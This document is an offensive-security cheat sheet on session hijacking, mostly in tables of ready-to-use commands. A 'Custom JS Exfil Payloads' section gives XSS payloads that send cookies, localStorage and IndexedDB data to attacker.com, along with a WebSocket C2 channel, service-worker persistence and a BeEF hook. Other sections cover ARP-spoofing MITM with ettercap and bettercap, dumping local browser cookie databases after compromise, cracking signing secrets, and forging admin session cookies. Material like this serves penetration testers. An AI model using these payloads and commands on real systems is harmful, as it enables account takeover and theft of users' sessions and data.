---
aliases:
  - Burp Session Handling
  - mitmproxy Cookie
  - Wireshark Cookie Capture
tags:
  - type/cheatsheet
  - vuln/session-hijacking
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Session Hijacking]]'
  - '[[Burp Suite]]'
  - '[[hashcat]]'
---
# Session Hijacking - Tooling

***

## Burp Session Handling Rules

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Settings → Sessions → Cookie Jar → "Open cookie jar" | View Burp managed cookies | Inspect captured. |
| Settings → Sessions → Session Handling Rules → "Add" → "Run a macro" | Macro re-auth on session expire | Long sessions. |
| Project → Macros → "Add" → record login flow → save as `login_macro` | Record auth flow for macro replay | Multi-step session. |
| Repeater → right-click → "Change body encoding" → modify `Cookie:` header | Manual cookie tampering | Standard tampering. |
| Comparer → Add request 1 + 2 → "Compare bytes" | Diff cookies between requests | Manual diff. |
| Sequencer → Live Capture → set "Token Location" to cookie value → Start | Cookie entropy randomness test | Predictable detect. |
| Decoder → paste cookie → "Smart decode" | Auto-detect base64/URL/hex decode | Format analysis. |
| Settings → Sessions → "Add" rule scope `*.target.com` → "Set cookie value" → static `session=STOLEN` | Replay stolen cookie globally | Stolen reuse. |
| Project options → Sessions → "Use cookies from cookie jar" enable per-tool | Per-tool cookie sharing | Workflow. |
| Right-click request → "Engagement tools" → "Generate CSRF PoC" → preview con session | Generate PoC con session | Reporting. |
| `extender.api.cookies.setCookies()` (Burp extension API) | Programmatic cookie injection | Custom extension. |
| Settings → Sessions → "In-scope items only" enable | Scope-bound cookie rules | Anti-leak. |
^sh-tool-burp

### Burp Sequencer for cookie analysis

```
1. Burp → Sequencer → Live capture
2. Configure target: select Cookie value parameter
3. Start capture (collect 100+ samples)
4. Analyze:
   - Bit-level entropy
   - Char frequency
   - Pattern detection
5. If entropy < 64 bits → vulnerable
```

___

## mitmproxy / Wireshark

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mitmproxy -p 8080` | Interactive TUI HTTPS proxy | Standard interactive. |
| `mitmweb --web-port 8081 -p 8080` | mitmproxy web UI | Easier UI. |
| `mitmdump -w flows.dump --set save_stream_file=stream.log` | Headless mitmproxy save flows | Background capture. |
| `mitmdump -s exfil.py` (con `def request(flow): print(flow.request.headers.get('Cookie'))`) | mitmproxy Python script auto-exfil | Programmable. |
| `mitmproxy --set "stream_websockets=true"` | WebSocket capture mode | WS sniff. |
| `sudo wireshark -i wlan0 -k -Y "http.cookie contains session"` | Wireshark filter on cookies | Live capture. |
| `tshark -i wlan0 -Y "http.cookie" -T fields -e http.cookie -e ip.src` | tshark CLI cookie + source IP | Headless. |
| `tshark -i any -Y "tls.handshake.type==1" -V` (with SSLKEYLOGFILE env) | Wireshark TLS decrypt via SSLKEYLOGFILE | TLS visibility. |
| `SSLKEYLOGFILE=/tmp/keys.log firefox` luego Wireshark Preferences → TLS → set keylog | Firefox/Chrome TLS keylog setup | Browser TLS visibility. |
| `sudo tcpdump -i eth0 -nn -A 'port 80' -w cap.pcap` | tcpdump plaintext capture | Raw network. |
| `sudo ngrep -W byline -q -i 'cookie' 'tcp port 80'` | ngrep filter cookies | Quick filter. |
| `sslsplit -k ca.key -c ca.crt -P -l connect.log https 0.0.0.0 8443` | Active MITM TLS proxy | TLS interception. |
| `sudo bettercap -iface eth0 -caplet http-req-dump` | Bettercap MITM all-in-one | Modern. |
| `sudo ettercap -T -M arp:remote /victim/ /gateway/` | Ettercap legacy MITM | Old reliable. |
| `zaproxy -port 8080 -config api.disablekey=true` | OWASP ZAP proxy | Free alt to Burp. |
^sh-tool-mitm

___

## Custom JS Exfil Payloads

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>fetch('//attacker.com/?c='+document.cookie)</script>` | Standard fetch exfil | Quick payload. |
| `<script>new Image().src='//attacker.com/?c='+document.cookie</script>` | Image-based exfil | CSP `img-src` allowed. |
| `<script>navigator.sendBeacon('//attacker.com/log', document.cookie)</script>` | Async sendBeacon survives unload | Modern unload. |
| `<script>fetch('/api/user/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker.com/?d='+btoa(d)))</script>` | Read auth'd response HttpOnly bypass | HttpOnly indirect. |
| `<script>const ws=new WebSocket('wss://attacker.com/c2');ws.onopen=()=>ws.send(document.cookie)</script>` | WebSocket C2 channel | Real-time C2. |
| `<script>navigator.serviceWorker.register('//attacker.com/sw.js')</script>` (SW persistence) | Service Worker persistence | Modern persistence. |
| `<script>top.postMessage(document.cookie,'*')</script>` (en injected iframe) | postMessage cross-frame exfil | iframe context. |
| `<script>fetch('//attacker.com/?ls='+btoa(JSON.stringify(localStorage)))</script>` | localStorage scrape | SPA token storage. |
| `<script>indexedDB.open('app').onsuccess=e=>e.target.result.transaction(['keys']).objectStore('keys').getAll().onsuccess=ev=>fetch('//attacker.com/?d='+btoa(JSON.stringify(ev.target.result)))</script>` | IndexedDB scrape | App-specific. |
| `<script>const b=new BroadcastChannel('app');b.onmessage=e=>fetch('//attacker.com/?d='+btoa(JSON.stringify(e.data)))</script>` | BroadcastChannel same-origin | Limited. |
| `<form action="//attacker.com" method="POST"><input name=c value=""/></form><script>document.querySelector('input').value=document.cookie;document.querySelector('form').submit()</script>` | Form auto-submit no-JS exfil | No-JS fallback. |
| `<style>@import url("//attacker.com/?c=NOT_POSSIBLE_DIRECT")</style>` (CSS exfil limited) | CSS exfil partial | No-JS edge. |
| `<script src="https://xss.report/c/USERNAME"></script>` (XSS Hunter) | XSS Hunter centralized capture | Pen-test workflow. |
| BeEF hook: `<script src="http://beef-server:3000/hook.js"></script>` | BeEF persistent browser hook | Advanced framework. |
^sh-tool-jspayload

### XSS Hunter setup

```
1. Sign up xsshunter.com or self-host (XSSHunter Express)
2. Receive unique <id>.xss.ht URL
3. Inject payload: <script src="https://<id>.xss.ht"></script>
4. Wait for victim trigger
5. Dashboard auto-captures:
   - URL
   - Cookies (non-HttpOnly)
   - DOM snapshot
   - Browser fingerprint
   - IP / User-Agent
6. Replay captured cookies en Burp
```

___

## cookie-monster / Local Cookie Extract

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `go install github.com/iangcarroll/cookiemonster/cmd/cookiemonster@latest && cookiemonster --cookie 'session=eyJ...'` | Auto-detect framework + crack signed cookies | Framework detection. |
| `cookiemonster --cookie 'session=...' --wordlist /usr/share/wordlists/rockyou.txt` | Brute signing secret | Crack mode. |
| `cookiemonster --cookie 'session=...' --resign --decoded '{"user":"admin"}'` | Forge new cookie post-crack | Forge after crack. |
| `python3 flask-unsign --decode --cookie '<COOKIE>'` | Flask session decode | Flask-specific. |
| `python3 flask-unsign --unsign --cookie '<COOKIE>' --wordlist rockyou.txt` | Flask SECRET_KEY brute | Flask brute. |
| `python3 flask-unsign --sign --cookie "{'_user_id':1,'is_admin':True}" --secret 'CRACKED'` | Flask forge admin cookie | Flask forge. |
| `ruby -ropenssl -rbase64 -rcgi -e "..."` (Rails cookie decode) | Rails encrypted cookie decrypt | Rails-specific. |
| `python3 django-secret-key-cracker.py --hash $DJANGO_COOKIE --wordlist secrets.txt` | Django SECRET_KEY brute | Django app. |
| `sqlite3 ~/.config/google-chrome/Default/Cookies "SELECT host_key,name,encrypted_value FROM cookies WHERE host_key LIKE '%target%'"` | Local Chrome cookies dump | Post-exploit local. |
| `sqlite3 ~/.mozilla/firefox/*.default/cookies.sqlite "SELECT host,name,value FROM moz_cookies WHERE host LIKE '%target%'"` | Local Firefox cookies | Local file. |
| `pip install pycookiecheat && python3 -c "from pycookiecheat import chrome_cookies; print(chrome_cookies('https://target.com'))"` | pycookiecheat auto decrypt | DIY Python. |
| `python3 mimikatz.py dpapi::chrome /unprotect /file:Cookies` | mimikatz Chrome DPAPI decrypt | Windows post-exploit. |
^sh-tool-cookie-monster

### cookie-monster workflow

```bash
COOKIE='session=eyJ.....SIGNATURE'

# 1. Detect framework
cookiemonster --cookie "$COOKIE"

# 2. Brute signing secret
cookiemonster --cookie "$COOKIE" --wordlist rockyou.txt

# 3. Forge new cookie con cracked secret
python3 -c "
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer('CRACKED_SECRET')
print(s.dumps({'_user_id': 1, 'is_admin': True}))
"
```

___

## Hashcat para Signed Cookies

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -a 0 -m 16500 jwt.txt rockyou.txt` | JWT HS256 secret crack | Standard JWT cookie. |
| `hashcat -a 0 -m 16511 jwt.txt rockyou.txt` | JWT HS384 variant | Alt algorithm. |
| `hashcat -a 0 -m 16512 jwt.txt rockyou.txt` | JWT HS512 variant | Alt algorithm. |
| `python3 flask2hashcat.py 'eyJ....SIG' > flask.hash && hashcat -a 0 -m 29100 flask.hash rockyou.txt` | Flask session cookie → hashcat format | Flask brute. |
| `hashcat -a 0 -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule` | JWT con mangling rules | Mutations. |
| `hashcat -a 0 -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule` | Aggressive rule mangle | Deep mutations. |
| `hashcat -a 3 -m 16500 jwt.txt '?l?l?l?l?l?l?l?l'` | Mask attack 8 lowercase | Sin wordlist. |
| `hashcat -a 3 -m 16500 jwt.txt '?a?a?a?a?a?a'` | All chars 6 length | Short secret. |
| `hashcat -a 6 -m 16500 jwt.txt rockyou.txt ?d?d?d?d` | Hybrid wordlist + 4 digits | Common pattern. |
| `hashcat -a 0 -m 16500 jwt.txt rockyou.txt -d 1,2 -w 3` | GPU device select + workload high | Performance. |
| `hashcat -a 0 -m 16500 jwt.txt rockyou.txt --session=jwt_crack` | Named session for resume | Long crack. |
| `hashcat --restore --session=jwt_crack` | Resume interrupted | Resume. |
| `hashcat -m 16500 jwt.txt --show` | Display cracked | Post-crack. |
| `git clone https://github.com/hashtopolis/server && docker-compose up` | hashtopolis distributed cracking | Scale. |
| `mp64.bin -1 ?l?u?d ?1?1?1?1?1?1?1?1` (maskprocessor) | Custom mask generation | Power tooling. |
| `python3 jwt_tool.py "$JWT" -C -d rockyou.txt -t 200` | jwt_tool 200-thread brute | Python brute. |
^sh-tool-hashcat

***
